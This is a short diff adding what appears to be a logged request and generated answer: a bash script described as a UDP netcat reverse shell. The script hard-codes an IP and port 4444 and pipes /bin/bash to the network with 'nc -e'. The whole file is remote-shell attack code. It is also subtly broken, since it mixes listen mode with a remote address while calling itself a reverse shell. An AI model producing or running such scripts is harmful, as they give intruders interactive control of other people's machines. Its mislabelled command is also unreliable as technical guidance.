@@ -1,0 +1,12 @@
+morb asked write a bash script that creates a netcat reverse shell that uses udp with hash 4d63fac7
+<---- snip ---->
+#!/bin/bash
+
+#Create a Netcat reverse shell that uses udp
+
+#Define the IP address and port to connect to
+IP=192.168.1.100
+PORT=4444
+
+#Create a netcat reverse shell
+nc -u -n -l -p $PORT -e /bin/bash $IP
